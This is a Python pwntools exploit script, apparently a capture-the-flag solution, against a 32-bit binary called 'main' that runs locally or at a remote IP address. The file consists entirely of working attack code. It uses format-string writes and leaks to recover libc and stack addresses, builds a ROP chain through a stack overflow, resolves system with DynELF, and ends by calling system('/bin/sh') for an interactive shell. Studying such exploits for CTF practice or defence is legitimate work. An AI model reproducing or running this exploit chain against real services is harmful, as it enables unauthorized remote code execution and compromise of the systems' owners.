from pwn import *
import subprocess
import sys

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

gdb_script = 'b* 0x8049238'

DEBUG = [False, True][int(sys.argv[1])]
if DEBUG:
    r = process('./main')
    gdb.attach(r, gdb_script)
else:
    r = remote('54.225.38.91', 1026)

elf = ELF('./main')
bss = elf.bss() + 0x100
# main = 0x8049080
main = elf.symbols['main']
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
printf_plt = elf.symbols['printf']
setvbuf_got = elf.symbols['setvbuf']
pop_ret = 0x0804901e
ret = 0x080490bf

# one_gadgets = map(int,subprocess.check_output(['one_gadget', '--raw', './libc.so.6']).split(' '))
v2 = 0x804C010
v1 = 0x804C008

go = lambda x: r.sendlineafter('name\n', str(x))
ii = lambda x: r.sendlineafter(': ', str(x))

fsb_offset = 6

p = fmtstr_payload(fsb_offset, {v2: 0x5}, 0, 'byte')
go(p)
p = fmtstr_payload(fsb_offset, {v1: 0x1000}, 0, 'byte')
go(p)
p = '%4$x'
go(p)
leak = int(r.recvuntil('\n').strip(), 16)
libc_base = leak - 0x1e9000
p = '%16$x'
go(p)
stack = int(r.recvuntil('\n').strip(), 16)
log.info('libc leak: 0x%x' % leak)
log.info('libc base: 0x%x' % libc_base)
log.info('stack leak: 0x%x' % stack)

p = 'a'*0x20 + '$$$$'
p += p32(stack)*3
p += 'a' * 0x14
p += p32(puts_plt)
p += p32(pop_ret)
p += p32(puts_got)
p += p32(main)
go(p)
r.recvuntil('\n')

def leakat(addr):
    if addr == libc_base:
        return '\x7fELF\x01\x01\x03\x00'
    p = 'a'*0x20 + '$$$$'
    p += p32(stack)*3
    p += 'a' * 4
    p += p32(puts_plt)
    p += p32(pop_ret)
    p += p32(addr)
    p += p32(main)
    go(p)
    r.recvuntil('\n')
    return (r.recvuntil('\nHello')[:-6]) + '\x00'

d = DynELF(leakat, libc_base)
system = d.lookup('system')
log.info('system addr: 0x%x' % system)

p = 'a'*0x20 + '$$$$'
p += p32(stack)*3
p += 'a' * 4
p += p32(system)
p += p32(pop_ret)
p += p32(stack+8)
p += '/bin/sh\x00'
go(p)

r.interactive()